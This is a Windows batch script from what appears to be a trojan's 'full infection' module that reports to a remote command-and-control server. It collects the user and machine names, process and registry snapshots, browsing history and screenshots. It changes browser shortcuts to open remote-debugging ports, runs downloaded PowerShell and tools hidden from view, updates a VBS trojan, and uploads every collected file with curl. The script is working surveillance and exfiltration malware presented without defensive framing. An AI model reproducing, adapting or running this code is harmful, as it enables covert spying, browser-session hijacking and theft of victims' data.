REM both are set by retrieve.php
REM SET jobcode=12345678
REM SET source=cmd_list_screen_capture.bat

set /a error_code=0

set sessionid=99%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%
set batchid=%sessionid%

set clientid=xxxxxxxx

SET "trojandir=%temp%\owd"

IF NOT EXIST %trojandir% (
    SET "trojandir=C:\ProgramData\owd"
)

IF NOT EXIST %trojandir% (
    goto :error_owd_folder_missing
)

cd /d %trojandir%

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
SET "timestamp=%tt:~0,14%%tt:~15,4%"
        
md %trojandir%\cmdlist_%timestamp%

cd /d %trojandir%\cmdlist_%timestamp%
    
set workdir=%trojandir%\cmdlist_%timestamp%

set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username

set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set params=
set params=%params% --data-urlencode "clientid=%clientid%"
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%" 
set params=%params% --data-urlencode "machinename=%machinename%" 
set params=%params% --data-urlencode "username=%tusername%"

IF "%trojandir%"=="C:\ProgramData\owd" (
    set params=%params% --data-urlencode "script_version=tpl_full_infection_script"
) ELSE (
    set params=%params% --data-urlencode "script_version=full_infection_script"
)

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=start_job" %params%

REM ---

set msg=setup done
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM --- start snapshot routine

set msg=starting snapshot routine
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM --- initial snapshot

dir /s %userprofile% > %workdir%\dir_snapshot_userprofile_init.txt
dir /s %trojandir% > %workdir%\dir_snapshot_trojandir_init.txt
wmic process get Name,ProcessId,CommandLine /format:csv > %workdir%\wmic_snapshot_init.txt
tasklist /v /fo:csv > %workdir%\tasklist_snapshot_init.txt
schtasks /query /v /fo:csv > %workdir%\schtasks_snapshot_init.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | Out-String -Width 4096 | Out-File %workdir%\ps1_cim_snapshot.txt" > %workdir%\ps1_cim_snapshot_cmd.log 2>&1

REM doesn't work access is denied
REM reg add HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files\Google\Chrome\Application\chrome.exe\" --remote-debugging-port=9223 -- \"^%1\"" /f
REM reg add HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --remote-debugging-port=9222 -- \"^%1\"" /f

REM for chrome
REM --remote-debugging-port=9223 --remote-allow-origins=* --restore-last-session --user-data-dir %trojandir%\chrome
set chromecmdlinearg=--remote-debugging-port=9223 --remote-allow-origins=^* --restore-last-session --user-data-dir=C:\users\%username%\AppData\Local\Temp\owd\chrome

REM for edge
REM --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session --profile-directory=Default
set edgecmdlinearg=--remote-debugging-port=9222 --remote-allow-origins=^* --restore-last-session --profile-directory=Default

set "patha=C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
set "pathb=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"

curl -o %trojandir%\modify_edge_lnk.ps1 -G %mothership%/ow/assets/modify_edge_lnk.ps1

REM -Verb RunAs
IF EXIST %trojandir%\modify_edge_lnk.ps1 (
    cd /d %workdir%
    conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1 "%edgecmdlinearg%"     "%patha%\Microsoft Edge.lnk" > %workdir%\modify_edge_lnk.ps1_cmd_edge_1.log 2>&1
    conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1 "%chromecmdlinearg%"   "%patha%\Google Chrome.lnk"  > %workdir%\modify_edge_lnk.ps1_cmd_chrome_1.log 2>&1
    conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1 "%edgecmdlinearg%"     "%pathb%\Microsoft Edge.lnk" > %workdir%\modify_edge_lnk.ps1_cmd_edge_2.log 2>&1
    conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1 "%chromecmdlinearg%"   "%pathb%\Google Chrome.lnk"  > %workdir%\modify_edge_lnk.ps1_cmd_chrome_2.log 2>&1
)

cd /d %trojandir%

REM --- cleanup

copy /y %trojandir%\*.log %workdir%

for /d %%G in ( %trojandir%\cmdlist_* ) do ( 
    if NOT "%%G"=="%workdir%" (
        rmdir /S /Q %%G 
    )
)
del /f /q %trojandir%\*.log
del /f /q %trojandir%\cmds_log_*.txt

cd /d %trojandir%

REM ---

goto :skip2305
curl -o %trojandir%\delete_owd_tasks.ps1 -G %mothership%/ow/assets/delete_owd_tasks.ps1

IF EXIST %trojandir%\delete_owd_tasks.ps1 (
    powershell.exe -ExecutionPolicy Bypass -File %trojandir%\delete_owd_tasks.ps1 %workdir%
)
:skip2305

REM ---
dir /s %USERPROFILE% > %workdir%\dir_userprofile_snapshot.txt

dir /s "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" > %workdir%\startup.txt
dir /s "%AppData%\Microsoft\Windows\Start Menu\Programs" > %workdir%\start_menu_links.txt
dir /s "%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"  > %workdir%\taskbar_links.txt
REM the only place edge and chrome links found
dir /s "%AppData%\Microsoft\Internet Explorer\Quick Launch > %workdir%\taskbar_links_a.txt

REM this is empty
dir /s "%appdata%\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts" %workdir%\dir_ab.txt 

dir /s C:\ProgramData\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ > %workdir%\startup_dir_a.txt
dir /s C:\Users\All Users\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ > %workdir%\startup_dir_b.txt
dir /s "%appdata%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" > %workdir%\dir_ac.txt


reg query "HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command" > %workdir%\reg_query_b.txt
reg query "HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command" > %workdir%\reg_query_c.txt
reg query "HKCU\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments" > %workdir%\reg_query_a.txt
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > %workdir%\reg_query_snapshot.txt

REM query all chrome and edge links

REM ---

IF NOT EXIST %trojandir%\handle.exe (
    curl -o %trojandir%\handle.exe %mothership%/ow/assets/handle.exe
)

IF EXIST %trojandir%\handle.exe (
    %trojandir%\handle.exe -v -accepteula > %workdir%\handle.txt 2>&1
)

IF NOT EXIST %trojandir%\BrowsingHistoryView.exe (
    curl -o %trojandir%\BrowsingHistoryView.exe %mothership%/ow/assets/BrowsingHistoryView.exe
)

IF EXIST %trojandir%\BrowsingHistoryView.exe (
     %trojandir%\BrowsingHistoryView.exe /HistorySource 2 /scomma %workdir%\history.csv
)


REM --- compare trojan MD5

type nul > %workdir%\old_zfei.md5
certUtil -hashfile %trojandir%\zfei.vbs MD5 | more +1 > %workdir%\old_zfei.md5
set /p old_zfei_md5=<%workdir%\old_zfei.md5

del /F /Q %trojandir%\zfei_upgrade.vbs

curl -o %trojandir%\zfei_upgrade.vbs -G %mothership%/ow/assets/zfei.vbs

IF EXIST %trojandir%\zfei_upgrade.vbs (
    type nul > %workdir%\new_zfei.md5
    certUtil -hashfile %trojandir%\zfei_upgrade.vbs MD5 | more +1 > %workdir%\new_zfei.md5
    set /p new_zfei_md5=<%workdir%\zfei_upgrade.md5
	
	copy /y %trojandir%\zfei_upgrade.vbs %trojandir%\zfei.vbs
    start "" /min /b wscript.exe /b %trojandir%\zfei.vbs
)

set script_version="full_infection_script"
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=update_snapshot" "old_zfei_md5=%old_zfei_md5%" "new_zfei_md5=%new_zfei_md5%" "script_version=%script_version%" %params%


REM --- screen capture

curl -o %trojandir%\get_full_screen_capture.ps1 -G %mothership%/ow/assets/get_full_screen_capture.ps1

IF EXIST %trojandir%\get_full_screen_capture.ps1 (
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\get_full_screen_capture.ps1 %workdir%
)

IF NOT EXIST %trojandir%\nircmdc.exe (
    curl -o %trojandir%\nircmdc.exe -G %mothership%/ow/assets/nircmdc.exe 
)

IF EXIST %trojandir%\nircmdc.exe (
    start "" /min %trojandir%\nircmdc.exe savescreenshot %workdir%\nircmd_screenshot.png
)

REM ---

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ---

cd /d %workdir%
copy /y %trojandir%\bbti.bat_cmds.log %workdir%

FOR %%F IN ("*") DO (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=uploading %%F" %params%

    curl -X POST --data-binary "@%%F" %mothership%/ow/upload.php?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&machinename=%machinename%^&username=%machinename%
)

REM ---

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

copy /y %trojandir%\bbti.bat_cmds.log %workdir%

curl -X POST --data-binary "@%trojandir%\bbti.bat_cmds.log" %mothership%/ow/upload.php?filename=bbti.bat_cmds.log^&batchid=%batchid%^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&jobcode=%jobcode%^&machinename=%machinename%^&username=%username%

set msg=errors occurred while executing error_code %error_code%
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" %params%

exit
